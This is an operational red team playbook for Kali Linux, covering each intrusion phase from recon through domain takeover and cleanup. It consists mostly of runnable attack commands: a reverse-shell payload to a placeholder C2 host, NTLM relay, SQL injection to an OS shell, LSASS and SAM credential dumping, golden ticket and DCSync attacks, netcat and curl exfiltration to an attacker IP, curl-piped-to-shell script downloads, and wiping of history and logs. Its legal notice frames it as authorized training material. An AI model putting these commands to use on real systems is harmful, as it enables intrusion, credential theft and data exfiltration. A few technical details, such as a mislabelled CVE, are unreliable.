---
tags: [redteam, engagement, guide, kali, practical, ops]
date: 2026-04-24
author: Max (Red Team Lead) — curated by clawd
---

# 🔴 Red Team Engagement Guide
### Kali Linux — Full Operational Playbook

> [!warning] Legal Notice
> Everything in this guide assumes you have **written authorization** before touching any system. This is an educational reference for authorized lab and engagement work only. Unauthorized access = federal crime. Don't be that person.

> [!info] Related Guides
> This guide is part of the **Cyber Exercise** vault. See also:
> - [[Network Enumeration Guide]] — systematic recon and enumeration procedures
> - [[Metasploit 101]] — exploitation framework for initial access and post-exploitation
> - [[Sliver C2 - Red Team Operator Guide]] — advanced C2 infrastructure and implant management

---

## 📋 Table of Contents

1. [[#1-pre-engagement-scoping--prep|1. Pre-Engagement: Scoping & Prep]]
2. [[#2-initial-recon--enumeration|2. Initial Recon & Enumeration]]
3. [[#3-gaining-first-access|3. Gaining First Access]]
4. [[#4-post-exploitation-enumeration|4. Post-Exploitation Enumeration]]
5. [[#5-privilege-escalation|5. Privilege Escalation]]
6. [[#6-credential-harvesting--pillaging|6. Credential Harvesting & Pillaging]]
7. [[#7-lateral-movement|7. Lateral Movement]]
8. [[#8-pivoting--redirecting|8. Pivoting & Redirecting Through Compromised Hosts]]
9. [[#9-domain--forest-domination|9. Domain / Forest Domination]]
10. [[#10-exfiltration--c2-sustainment|10. Exfiltration & C2 Sustainment]]
11. [[#11-reporting|11. Reporting]]
12. [[#12-cleanup|12. Cleanup]]
13. [[#13-checklists|13. Checklists]]
14. [[#14-tool-reference|14. Tool Reference by Phase]]

---

## 1. Pre-Engagement: Scoping & Prep 🗺️

### What You Need Before You Touch Anything

**Document everything.** Your client will sign off on a Scope of Work (SOW) that lists:
- Target IP ranges / domains / URLs
- Which user accounts you may use (if any — "authenticated" vs "unauthenticated" test)
- What you are **NOT** allowed to touch (safety systems, DCs in production, etc.)
- Start and end dates + allowed testing hours
- Emergency contact (your handler on the blue team)
- Communication channel (Signal, encrypted email, or dedicated Slack channel)
- Rules on persistence — are you allowed to install implants that survive reboots?

> [!tip] Golden Rule
> If it's not in scope, document that you **chose not to attack it** and moved on. This protects you and sets expectations.

### Engagement Type Decision Framework

| Type | What It Is | When to Use |
|------|-----------|-------------|
| **Full Red Team** | No credentials, no assumptions — you go in blind | Simulate real APT, objective-based |
| **Penetration Test** | You get some creds or a user account | Compliance-driven, scoped assessment |
| **Adversary Emulation** | You emulate a specific threat actor's TTPs | [[Emulation Plan\|Emulation Plan]] based on [[TTPS]] |
| **Purple Team** | You and defenders work together in real-time | Training and capability building |

### Your Kali Box Prep Checklist

Run this before engagement day:

```bash
# === Core tools check ===
which nmap nikto gobuster sqlmap hydra medusa john hashcat
which responder impacket-scripts crackmapexec bloodhound neo4j
which smbclient rpcclient ldapsearch nmblookup enum4linux
which msfconsole coffee ghostly seclists dirb wfuzz
which responder.py ntlmrelayx.py smbserver.py

# === Update Kali ===
sudo apt update && sudo apt upgrade -y

# === Clone / update essential repos ===
git clone https://github.com/TheLordOfThePings/JTS/ /opt/JTS 2>/dev/null
git clone https://github.com/CheapNPC/PowerSploit /opt/PowerSploit 2>/dev/null
git clone https://github.com/EmpireProject/Empire /opt/Empire 2>/dev/null

# === Start required services ===
sudo systemctl start neo4j          # BloodHound needs this
sudo neo4j console &
# or: sudo systemctl start neo4j

# === Set up loot directory ===
mkdir -p ~/engagements/$(date +%Y%m%d)/loot
mkdir -p ~/engagements/$(date +%Y%m%d)/screenshots
mkdir -p ~/engagements/$(date +%Y%m%d)/notes
```

### OPSEC During Prep
- Use a **VPN or dedicated hop point** — never run tools directly from your home IP
- Ensure your Kali hostname doesn't give you away (`clawd-kali` is fine; `hackerbot` is not)
- Check your `/etc/hosts`, `~/.bashrc`, and `~/.msf4/history` for sensitive strings before engagement
- [[Sliver C2 - Red Team Operator Guide|Set up your C2 infrastructure]] before the engagement starts — don't rush this during active ops

---

## 2. Initial Recon & Enumeration 🔍

### The Golden Rule: Enumerate First, Exploit Never

> [!important]
> 70% of a successful engagement is **not missing something obvious**. Most new red teamers rush to run Metasploit. The pros spend hours enumerating first.

### External Recon (Pre-Physical Access)

```bash
# === DNS Enumeration ===
host -t MX target.com
host -t TXT target.com
dnsenum target.com
dnsrecon -d target.com -r 10.0.0.0/8 -- threads 20

# === Subdomain Discovery ===
amass enum -passive -d target.com
sublist3r -d target.com
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt \
  -u https://target.com -H "Host: FUZZ.target.com" -t 50

# === Port Scanning ===
sudo nmap -p- -sS -sV -O -T4 --script=default -oA full_scan target.com
# Quick scan for top ports:
nmap --top-ports 100 -sS -oA quick_scan target.com

# === Service-Specific Scans ===
nikto -h https://target.com -o nikto_output.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -k -o gobuster.txt
```

### Internal Recon (Once You Have a Foothold)

```bash
# === Host Discovery ===
nmap -sn 10.10.10.0/24           # Ping sweep
nmap -PR -sn 10.10.10.0/24       # ARP sweep (better for internal)
for /L %i in (1,1,254) do @ping -n 1 -w 1 10.10.10.%i | find "Reply"  # Windows

# === SMB Enumeration (Kali side) ===
enum4linux -a 10.10.10.150
smbclient -L //10.10.10.150 -N
rpcclient -U "" -N 10.10.10.150
nmblookup -A 10.10.10.150

# === LDAP Recon ===
ldapsearch -x -h 10.10.10.150 -b "DC=target,DC=local" | head -100

# === SNMP Recon ===
snmpwalk -c public -v1 10.10.10.150
onesixtyone -c /usr/share/snmp/enums/community.txt 10.10.10.150
```

### Decision Framework: When to Move On

**If you find...** | **Then try...**
---|---
Open SMB (445) with null sessions | `enum4linux`, `smbclient`, `rpcclient`
LDAP exposed (389) | `ldapsearch`, then BloodHound
VPN or remote access portal | Login page — check for default creds, try [[6 - Information Gathering]]
Web app on unusual port | `nikto`, `gobuster`, check for CVEs
DNS server | Zone transfers (`dig axfr`), subdomain enum
SSH (22) open | User enumeration, ssh-audit, later use for lateral movement

**When to escalate:**
- You've mapped all live hosts in the subnet
- You've identified OS versions, running services, and versions
- You have at least one potential exploitation vector
- You've documented everything — screenshots, logs, tool output

---

## 3. Gaining First Access 💥

### Exploitation Decision Tree

```
Is there a web application?
├── YES → Check for SQLi, XSS (stored, reflected), IDOR, SSRF, LFI/RFI
│         └── Tools: sqlmap, burpsuite, gobuster, nikto
└── NO → Check for:
          ├── Open SMB with no creds? → Responder / NTLM relay
          ├── SSH with weak creds? → hydra, medusa
          ├── SNMP with default community strings? → snmpwalk
          └── Any known CVEs on discovered services? → searchsploit, nmap --script=vuln
```

### Common Exploitation Paths

#### Path 1: Phishing + Implant (Most Common)

```bash
# Generate a payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=YOUR_C2_IP LPORT=443 -f exe -o shell.exe

# Or use Covenant for C#
dotnet build

# With Sliver (preferred):
# Generate implant via [[Sliver C2 - Red Team Operator Guide]]
# Use cobalt strike or empire for coordinated campaigns
```

#### Path 2: SMB / NTLM Relay

```bash
# Run Responder to poison LLMNR/NBT-NS
sudo responder -I eth0 -dwP

# In another terminal, relay captured hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# If you get a shell:
# ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

#### Path 3: SQL Injection

```bash
# Identify injection point
sqlmap -u "http://target.com/page?id=1" --batch --level=3
# If DBA access achieved:
sqlmap -u "http://target.com/page?id=1" --batch --os-shell
# Or direct shell:
sqlmap -u "http://target.com/page?id=1" --batch --os-pwn
```

#### Path 4: Service Exploitation

```bash
# Search for known exploits
searchsploit servicename version
nmap --script=vuln -pport target.com

# Example: EternalBlue
searchsploit "EternalBlue"
# Use Metasploit module or independent exploit
```

### Decision Framework: If Initial Exploit Fails

1. **Re-enumerate** — You missed something. Run a more thorough port scan
2. **Try alternate service versions** — Banner grabbing lies sometimes
3. **Check for default credentials** — `root:root`, `admin:admin`, vendor defaults
4. **Phishing** — Even if you can't exploit a service, phishing a user gets you in
5. **Walk away from this vector** — Move to another target in scope

> [!warning] OPSEC
> Responder can generate a lot of noise. On sensitive engagements, use `-dwP` (disable WPAD) and be aware that NTLM relay generates Windows event log entries (Event ID 4624 — An account was successfully logged on)

---

## 4. Post-Exploitation Enumeration 🔬

### Linux Host Enum (First 5 Minutes)

```bash
# === Who are you? ===
id; hostname; whoami; w; last

# === Network state ===
ip a; route -n; cat /etc/resolv.conf
ss -tunap               # All connections — THIS is gold
netstat -tunap

# === What processes are running? ===
ps aux --forest         # Tree view shows parent-child relationships
ps auxf | grep -v grep | grep -E "(mysql|postgres|apache|nginx|tomcat|jdbc)"

# === What files are open? ===
lsof -i -nP            # FDs = files AND network connections
lsof +c 0 /            # Show command name for all open files

# === Cron jobs & scheduled tasks ===
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/
crontab -l

# === SUID binaries ===
find / -perm -4000 -type f 2>/dev/null

# === Kernel & OS info ===
uname -a; cat /etc/os-release
cat /etc/issue

# === Readable config files ===
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | \
  xargs grep -l -i "password\|pass\|credential" 2>/dev/null

# === The /proc filesystem — treasure chest ===
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
  echo "=== PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ') ==="
done
```

### Windows Host Enum (PowerShell)

```powershell
# === System info ===
hostname; whoami /all; whoami /groups
systeminfo
net user; net localgroup Administrators

# === Network state ===
ipconfig /all
netstat -ano | sort -k 5 -n

# === Running processes ===
tasklist /v
wmic process list brief

# === Services ===
sc query; sc qc servicename

# === Registry auto-runs ===
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Autoruns tool is even better:
autoruns64.exe

# === Event logs — last hour of activity ===
wevtutil qe Security /c:20 /f:text /rd:true /q:"*[System[TimeCreated[timediff(@SystemTime) <= 3600000]]]"

# === Am I in a domain? ===
nltest /dsgetdc:domainname
nltest /dclist:domainname
```

### Decision Framework: What to Look For

**High-value targets on ANY host:**
- [ ] Credentials in plaintext (config files, scripts, .bash_history)
- [ ] SSH keys (`~/.ssh/`)
- [ ] Database connection strings
- [ ] API tokens or secrets in environment variables (`env | grep -i key`)
- [ ] Service accounts with excessive privileges
- [ ] Interesting files in `/home` or `C:\Users`

**On Windows especially:**
- [ ] Stored browser passwords (`Chrome`, `Firefox`)
- [ ] Credential Manager (Vaul vault)
- [ ] Cached domain credentials (registry)
- [ ] Kerberos TGT tickets (if you're SYSTEM or a service account)

**When to move on from enum:**
- You've identified 2+ privilege escalation paths
- You have valid credentials for another system
- You've mapped the network topology from this host
- You've found domain context (if applicable)

---

## 5. Privilege Escalation 🪜

> [!tip] Philosophy
> Don't run random privesc exploits. Look at what you're running AS, what you're part of, and what's misconfigured. Then find the exploit that fits that specific gap.

### Linux Privilege Escalation — Decision Tree

```
What user are you?
├── UID=0? → You're root. Skip to pillaging.
└── Not root:
    ├── Can you sudo?
    │   └── sudo -l → What can you run as root?
    │        ├── ANY command without password? → sudo su -
    │        ├── find, vim, less, more, nmap? → GTFOBins
    │        ├── apt/dpkg? → sudo apt update && sudo apt install -y sl
    │        └── python/perl/ruby? → sudo python -c 'import os; os.system("/bin/bash")'
    │
    ├── SUID binaries?
    │   └── find / -perm -4000 -type f 2>/dev/null
    │        ├── pkexec, gpasswd, newgrp, chfn, chsh, mount, umount, su → GTFOBins
    │        └── Custom binary? → strings it, look for system() calls
    │
    ├── Is the kernel exploitable?
    │   └── uname -r → searchsploit "Linux kernel $version"
    │        └── Example: dirty pipe (CVE-2022-0847), overlayfs (CVE-2021-3493)
    │
    ├── Capabilities misconfigured?
    │   └── getcap -r / 2>/dev/null
    │        ├── python with cap_setuid? → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    │        └── tcpdump? → Can sniff traffic → MiTM opportunities
    │
    ├── Cron jobs you can write to?
    │   └── ls -la /etc/cron.d/; crontab -l
    │        └── Wildcard in a cron script? → Wildcard injection exploits
    │
    └── NFS no_root_squash?
        └── showmount -e target; mount -o rw,vers=3 target:/share /mnt
```

**Automated Linux privesc scanners:**
```bash
# LinPEAS — the gold standard
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240421/linpeas.sh | sh

# LinEnum — simpler, good for quick checks
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# linux-exploit-suggester-2
curl -L https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/main/linux-exploit-suggester-2.pl | perl -
```

### Windows Privilege Escalation — Decision Tree

```
What user are you?
├── BUILTIN\Administrators or Domain Admins? → Skip.
└── Standard user or service account:
    ├── Are you in a privileged group?
    │   ├── Remote Desktop Users → RDP to other systems
    │   ├── Backup Operators → Read any file including SYSTEM hives
    │   ├── DNS Admins → DLL injection via DNS service
    │   └── Hyper-V Admin → Hyper-V VM manipulation
    │
    ├── Can we run anything as SYSTEM?
    │   ├── sc qc servicename → check service binary path
    │   ├── icacls → Can we overwrite a service binary?
    │   └── unquoted service paths → Path hijacking
    │
    ├── AlwaysInstallElevated enabled?
    │   └── reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    │   └── reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    │       → msfvenom -p windows/meterpreter/installer LHOST=... -f msi
    │
    ├── Scheduled tasks with writable scripts?
    │   └── schtasks /query /fo LIST /v
    │
    ├── Missing patches?
    │   └── windows-exploit-suggester.py --update
    │       └── windows-exploit-suggester.py --database 2024-01.xlsx --systeminfo sysinfo.txt
    │           Notable: MS16-032 (Print Spooler), MS14-068 (Kerberos), Juicy Potato
    │
    ├── SeImpersonatePrivilege?
    │   └── JuicyPotatoNG.exe, PrintSpoofer.exe, RoguePotato
    │
    ├── SeBackupPrivilege / SeRestorePrivilege?
    │   └── Registry backup → SAM/SYSTEM hives → hashdump
    │
    └── Rotten Potato / Lonely Potato / SweetPotato?
        └── New Potato variants for different contexts
```

**Automated Windows privesc scanners:**
```powershell
# WinPEAS — runs via cmd or PowerShell
winpeas.exe

# PowerSploit: PrivescCheck
Import-Module ./PrivescCheck.ps1; Invoke-PrivescCheck

# Seatbelt (from GhostPack)
Seatbelt.exe -StandardChecks

# SharpUp
SharpUp.exe audit
```

> [!tip] The Print Spooler Vuln Path (Windows Servers)
> If the target is a Windows server (especially DC), check Print Spooler status: `Get-Service Spooler`
> If running, you may be able to exploit CVE-2022-38023 or similar Print Spooler bugs to get SYSTEM.

---

## 6. Credential Harvesting & Pillaging 🎯

### Linux Credential Pillaging

```bash
# === /etc/passwd and /etc/shadow ===
# If you can read shadow, run john or hashcat
unshadow /etc/passwd /etc/shadow > /tmp/combined
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined
hashcat -m 1800 /tmp/combined /usr/share/wordlists/rockyou.txt

# === SSH keys ===
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null

# === Config files with creds ===
grep -r -i "password" /etc/*.conf 2>/dev/null | grep -v "permission denied"
find / -name "*.conf" -o -name "*.cnf" -o -name "*.cfg" 2>/dev/null | \
  xargs grep -l -i "password\|pass\|secret\|key" 2>/dev/null

# === Database credentials ===
cat /etc/mysql/my.cnf
cat /etc/postgresql/pg_hba.conf
cat /var/www/html/config.php 2>/dev/null

# === .bash_history — often contains gold ===
cat ~/.bash_history | grep -E "(mysql|psql|ssh|scp|ftp|wget|curl|su |sudo )"

# === Kerberos tickets (if linux with Kerberos) ===
klist
cat /tmp/krb5cc_* 2>/dev/null
```

### Windows Credential Pillaging

```powershell
# === SAM database (if registry hives accessible) ===
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# On Kali, extract:
samdump2 system.hive sam.hive
john --format=NT sam.hashes.txt

# === Cached domain credentials ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# or use:
crackmapexec smb target.com --local-auth -u admin -p password --sam

# === LSASS dump (for TGT tickets and creds) ===
# Via meterpreter:
migrate lsass.exe
or
tasklist /FI "IMAGENAME eq lsass.exe"
# procdump from Sysinternals:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# On Kali:
pypykatz lsa lsass.dmp

# === Cobalt Strike / Sliver built-ins ===
# beacon> hashdump
# beacon> logonpasswords

# === Mimikatz (run from Kali targeting remote host) ===
python3 wmiexec.py domain/username:password@target "privilege::debug sekurlsa::logonpasswords"

# === Secretsdump (automatic) ===
python3 secretsdump.py domain/username:password@target.com
# Or with just NTLM hash:
python3 secretsdump.py -hashes :NTLMHASH@target.com
```

### Kerberoasting (High Value, Low Noise)

```bash
# Find service accounts with SPNs (Kerberoastable)
# From Kali:
python3 GetUserSPNs.py domain/username:password -dc-ip DC_IP -request
# Or via PowerView:
powershell -Command "Get-DomainUser -SPN | Select-Object name,serviceprincipalname"

# Crack the TGS offline:
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hash.txt
```

---

## 7. Lateral Movement 🚀

### The Lateral Movement Matrix

**Based on what you have** | **Use this tool/technique**
---|---
Password | `crackmapexec`, `pth-winexe`, `evil-winrm`, `psexec.py` |
NTLM Hash | `pth-winexe`, `smbexec`, `impacket-psexec` (pass-the-hash) |
Kerberos Ticket (TGT/TGS) | `ticketer.py`, `getTGT.py`, `invoke-Kerberoast` |
SSH Key | `ssh -i key.pem user@target` |
SMB share access | `smbclient`, `rpcclient` |

### Kali Tool Chain: From Hash to Shell

```bash
# === CrackMapExec — the workhorse ===
# Password spraying across the domain:
crackmapexec smb target.com/10.10.10.0/24 -u administrator -p 'Password123!' --local-auth
# Pass-the-Hash:
crackmapexec smb target.com -u administrator -H "NTLMHASH" --local-auth

# === Impacket psexec ===
python3 psexec.py domain/username:password@target
python3 psexec.py -hashes :NTLMHASH domain/user@target

# === WMI Exec ===
python3 wmiexec.py domain/username:password@target "whoami"

# === Pass the Hash with winexe ===
pth-winexe --system --uname -U domain/username%NTLMHASH //target cmd.exe

# === Evil-WinRM ===
evil-winrm -i target -u username -p 'password'
evil-winrm -i target -u username -H 'NTLMHASH'

# === SSH pivoting ===
ssh -D 1080 user@target        # SOCKS proxy through target
ssh -L 8080:localhost:8080 user@target  # Local port forward
```

### Decision Framework: Which Host to Move To Next

**Priority order for lateral targets:**
1. **Domain Controller** — If you have domain admin creds or can get them, DC is the crown jewels
2. **File server / shares** — `smbclient` or `rpcclient` to find sensitive data
3. **Database servers** — Pull data directly or harvest more creds
4. **Build servers / CI-CD** — Often have service accounts with broad access
5. **Jump servers / RDGateway** — Good pivot points

**If you can't move laterally:**
- Re-examine credentials — maybe a service account has more access than you thought
- Kerberoast the service accounts you found
- Check for AS-REP roasting (users without preauth)
- Phish another user from this position

> [!warning] OPSEC During Lateral Movement
> - `psexec.py` and `smbexec.py` create **SMB sessions** with Windows Event ID 4624 + Logon Type 3 — very noisy
> - `wmiexec.py` uses **WMI only** — quieter (single DCERPC connection, no SMB)
> - `crackmapexec` leaves entries in **SMB logs** and can trigger account lockouts with repeated failures
> - **Dead drop resolvers** (DNS callbacks) are quieter than direct IP callbacks

---

## 8. Pivoting & Redirecting Through Compromised Hosts 🔀

### Setting Up a Pivot Through a Compromised Host

```bash
# === Chisel (golang pivot tool) — Kali side ===
# Listener on Kali (your attacking box):
./chisel server -p 8080 --reverse

# On the compromised host, download and run chisel client:
# (Upload via your C2 or wget from your server)
./chisel client YOUR_KALI_IP:8080 R:socks

# Now you have a SOCKS proxy through the compromised host on localhost:1080

# === SSH pivoting (if target has SSH) ===
ssh -D 1080 -f -N user@compromised-host

# === meterpreter routing ===
# Inside meterpreter session:
run autoroute -s 10.10.10.0/24
# Now use modules against 10.10.10.x through the session

# === SOCAT for port forwarding ===
# On compromised host:
socat TCP-LISTEN:4444,fork TCP:internal-target:3389
# Now connect to compromised_host:4444 to reach internal_target:3389
```

### Scanning Through a Pivot

```bash
# === Proxychains through pivot ===
# Edit /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080
# Then:
proxychains nmap -sT -Pn 10.10.10.150 -p 445

# === Proxychains with chains ===
proxychains4 nmap --top-ports 20 -sT -Pn 192.168.50.0/24

# === Note: proxychains doesn't work with UDP scans well ===
# Better: run scanner from the compromised host itself
```

### Multi-Tier Pivoting

```
Your Kali → Compromised Web Server (10.10.10.20) → Internal DB Server (172.16.10.30)

Setup:
1. chisel client on web server → connects to your Kali chisel server
2. From Kali, proxychains to scan/attack 172.16.10.30
3. Or: meterpreter route through web server session to hit 172.16.10.30
```

> [!tip] Pivot OPSEC
> - Always prefer **port forwards** over full SOCKS proxies for specific targets — less noisy
> - Chisel is encrypted (harder to detect) vs `proxychains + nmap` which sends plaintext through the tunnel
> - If the compromised host is a Windows server, consider **RDP tunneling** instead — blends in better

---

## 9. Domain / Forest Domination 👑

### BloodHound: The Maps You Need

```bash
# === On Kali: Run BloodHound ===
# Start Neo4j first:
sudo neo4j console &
# Open BloodHound GUI:
bloodhound &
# Or use the Ingestor (Sharphound) from Windows target:

# === On Windows target, run Sharphound ===
# Via C2 beacon:
# beacon> upload SharpHound.exe
# beacon> execute-assembly SharpHound.exe -c all

# Collects: AD users, groups, trusts, ACLs, GPOs, OU structure

# === Import into BloodHound ===
# In BloodHound GUI: Upload the .json.zip files

# === Key queries to run in BloodHound ===
- Find all paths to Domain Admins
- Find users with DCSync rights
- Find computers where Domain Admins log in
- Find misconfigured ACLs (WriteDACL, GenericAll, etc.)
- Find users with Unconstrained Delegation
- Find Constrained Delegation abuse paths
- Find GPOs that can be modified
```

### The Golden Ticket Attack

```bash
# === On Kali with Impacket ===
# Get thekrbtgt NTLM hash via secretsdump:
python3 secretsdump.py domain/username:password@dc.domain.com

# Create a golden ticket:
python3 ticketer.py -domain domain.com -domain-sid S-1-5-21-XXXXX \
  -nthash KRAKTGT_HASH -spn krbtgt/domain.com user@domain.com

# Set the ticket:
export KRB5CCNAME=user.ccache
# Now you can access any resource:
python3 psexec.py -k -no-pass user@target.domain.com
```

### DCSync Attack

```bash
# If you have rights to DCSync (usually Domain Admins or Enterprise DCs):
python3 secretsdump.py domain/username:password@dc.domain.com -just-dc-user "DOMAIN\krbtgt"

# This dumps ALL password hashes from the DC without touching the DC filesystem
# Those hashes can be used for:
# - Pass-the-Hash anywhere in the domain
# - Golden ticket creation
# - Kerberoasting with cracked NTLM
```

### BloodHound Path to DA

```
Common paths to Domain Admin in BloodHound:

Path 1: Service Account → Kerberoast → Domain Admin
  User with SPN → Kerberoast → Hash cracked → Service account creds
  → Check if service account is member of Domain Admins

Path 2: User with WriteDACL on another user → ACL abuse
  WriteDACL on target → Add yourself to Domain Admins

Path 3: Unconstrained Delegation computer → Printer Bug → DC capture
  Spooler service bug from MS-RPRN → Relay to DC for TGT of DC$ machine account

Path 4: Passwordspray → WinRM to server → local privesc → DCSync
```

> [!danger] OPSEC — Domain-Level Attacks Are Loud
> - Golden ticket use generates **TGS-REQ events** ( Kerberos ticket requests ) at the DC
> - DCSync generates **Directory Service Access events** (Event ID 4662) — very suspicious
> - BloodHound collection itself generates a burst of LDAP queries that defenders WILL see
> - **Time your domain domination for end of engagement** — you don't want to get burned early

---

## 10. Exfiltration & C2 Sustainment 📤

### Data Exfiltration

```bash
# === Simple file transfer to your server ===
# On Kali (receive):
nc -lvnp 4444 > loot.zip

# On compromised host:
# Windows:
nc -nv YOUR_KALI_IP 4444 < C:\sensitive\data.zip
# Linux:
nc -nv YOUR_KALI_IP 4444 < /tmp/loot.tar.gz

# === With compression ===
tar czf - /important/data | nc -lvnp 4444

# === HTTP exfil (Kali as web server) ===
# On Kali:
python3 -m http.server 8080
# On target:
curl -X POST -F "file=@sensitive.xlsx" http://YOUR_KALI_IP:8080/upload

# === DNS exfiltration (slow but bypasses many firewalls) ===
# Use tools like:
# - dnsteal.py
# - iodine
# - dns2tcp
python3 dnsteal.py YOUR_KALI_IP secret  # Run on Kali
# On target: send data via DNS TXT records
```

### C2 Sustainment: Not Losing Your Beacon

```
Problem: Your C2 beacon gets burned, domain flagged, or implant detected.
Solution: Have redundant infrastructure ready BEFORE you need it.

Backup C2 channels:
1. DNS C2 — very slow, very stealthy (Sliver, Merlin, Cobalt Strike)
2. HTTPS C2 — blends with normal web traffic (most common)
3. SMTP/POP3 C2 — emails as C2 channel (rare but powerful)
4. Domain Fronting — Azure/AWS CloudFront as proxy (harder now)
```

```bash
# === [[Sliver C2 - Red Team Operator Guide|Set up multiple Sliver listeners]] ===
# Primary: HTTPS beacon
# Fallback 1: DNS C2
# Fallback 2: WireGuard peer-to-peer

# === Redirectors (Apache/Nginx fronting your C2) ===
# Redirect.conf for Apache:
# RedirectMatch ^/(.*)$ http://legitimate-site.com/$1
# (Makes your C2 look like a normal website)
```

---

## 11. Reporting 📝

See also: [[5 - Report Writing]] for report format specifics.

### Report Structure

```
EXECUTIVE SUMMARY (1 page max)
  - Objective
  - Overall risk rating
  - Key findings (top 5)
  - Recommended next steps

TECHNICAL FINDINGS
  - Each finding needs:
    - Title + CVSS score
    - Description
    - Impact
    - Evidence (screenshots, commands, logs)
    - Replication steps
    - Remediation

ENGAGEMENT TIMELINE
  - Day-by-day activity log
  - TTPs used (map to MITRE ATT&CK)

REMEDIATION ROADMAP
  - Prioritized by risk
  - Short/medium/long-term recommendations
```

**CVSS Risk Ratings:**
- **Critical (9.0-10.0)**: Immediate action required (e.g., found credentials, RCE)
- **High (7.0-8.9)**: Remediate within 30 days
- **Medium (4.0-6.9)**: Remediate within 90 days
- **Low (0.1-3.9)**: Monitor / accept risk

> [!tip] For OSCP/OSCE
> Practice writing reports as you go. Screenshot everything. The exam requires a professional report — start this habit now, not after the exam.

---

## 12. Cleanup 🧹

### What to Clean (And How)

```bash
# === Kali side ===
# Clear your history:
cat /dev/null > ~/.bash_history
# Clear Metasploit history:
cat /dev/null > ~/.msf4/history
# Clear tool logs:
find ~/engagements -name "*.log" -exec rm {} \;

# === Windows target side ===
# Remove uploaded tools:
del C:\Temp\linpeas.exe
del C:\Temp\uploaded_implant.exe

# Clear PowerShell history:
Remove-Item (Get-PSReadlineOption).HistoryFilePath -ErrorAction SilentlyContinue

# Remove event logs you may have touched (risky — only if explicitly in scope):
# Wevtutil cl Security /bu:backup.evtx  # (This itself generates a log — be careful)

# Remove scheduled tasks you created:
schtasks /delete /tn "MaliciousTaskName" /f

# Remove services you installed:
sc delete "EvilServiceName"
```

> [!warning] Cleanup OPSEC
> - **Deletion itself creates artifacts** — defanging (making tools non-functional) is often quieter than deleting
> - Document what you cleaned up — you need to tell the client what you did for the remediation report
> - **NEVER** delete evidence that the client needs for their incident response — coordinate with the handler

---

## 13. Checklists ✅

### 🔲 Pre-Engagement Checklist

- [ ] Scope document signed and stored securely
- [ ] Emergency contact (client handler) confirmed
- [ ] Communication channel established (Signal / encrypted email)
- [ ] Rules of engagement reviewed — what's in scope, what's not
- [ ] Allowed testing hours confirmed
- [ ] Kill switch / abort procedure agreed upon
- [ ] Kali tools updated and verified working
- [ ] VPN / hop point configured
- [ ] C2 infrastructure deployed and tested
- [ ] [[Sliver C2 - Red Team Operator Guide|C2 listeners verified — primary and fallback]]
- [ ] Loot directory created (`~/engagements/YYYYMMDD/loot/`)
- [ ] Note-taking system active (CherryTree, Obsidian, OneNote)
- [ ] BloodHound + Neo4j running
- [ ] [[6 - Information Gathering|Initial recon collected and organized]]

### 🔲 Daily OPSEC Checklist (Run Each Morning)

- [ ] Check your C2 beacon is still alive
- [ ] Verify you're still within allowed testing hours
- [ ] Review overnight logs for unexpected blue team activity
- [ ] Screenshot all new access before touching anything
- [ ] Document current position and objectives for the day
- [ ] Ping the client handler — confirm no incidents or concerns
- [ ] Check scope hasn't changed
- [ ] Verify your hop/VPN hasn't changed IP

### 🔲 Per-Phase Checklist

#### After Gaining Initial Access:
- [ ] Screenshot the initial shell — document the host, user, and time
- [ ] Confirm you know exactly what user you are
- [ ] Enumerate the host (network, users, processes, files)
- [ ] Identify your first pillaging targets
- [ ] Check if this host is a good pivot point
- [ ] Is the implant stable? Does it survive reboot?

#### After Privilege Escalation:
- [ ] Re-document your new context (who are you now?)
- [ ] Harvest credentials immediately (before anything else)
- [ ] Check if you're now Domain Admin or have domain-level access
- [ ] Identify next lateral movement target
- [ ] Clean up privesc artifacts

#### After Lateral Movement:
- [ ] Document new host — screenshot, hostname, IP, user
- [ ] Re-run host enumeration on new target
- [ ] Harvest any new credentials found
- [ ] Check if new host gives access to new network segments
- [ ] Plan: do you keep this shell or can this host serve as a pivot?

### 🔲 Post-Engagement Checklist

- [ ] Verify all shells/implants are cleanly removed
- [ ] Remove all tools from target systems
- [ ] Restore any modified configurations (if agreed upon)
- [ ] Document all cleanup activities
- [ ] Consolidate all screenshots, notes, and tool output
- [ ] Draft the finding writeups with evidence
- [ ] Build the timeline of engagement
- [ ] Map TTPs to MITRE ATT&CK framework
- [ ] Calculate CVSS scores for all findings
- [ ] Write executive summary
- [ ] Deliver report to client via secure channel
- [ ] Conduct lessons-learned debrief with client
- [ ] Archive all engagement artifacts securely

---

## 14. Tool Reference by Phase 🔧

### Phase → Tool Matrix

| Phase | Kali Tool | Purpose |
|-------|-----------|---------|
| **Recon** | `nmap` | Port scanning, service discovery, OS detection |
| **Recon** | `amass` | Subdomain enumeration |
| **Recon** | `ffuf` / `gobuster` / `dirb` | Web directory discovery |
| **Recon** | `nikto` | Web vulnerability scanning |
| **Recon** | `dnsenum` / `dig` | DNS enumeration and zone transfers |
| **Recon** | `theHarvester` | Email and employee enumeration from OSINT |
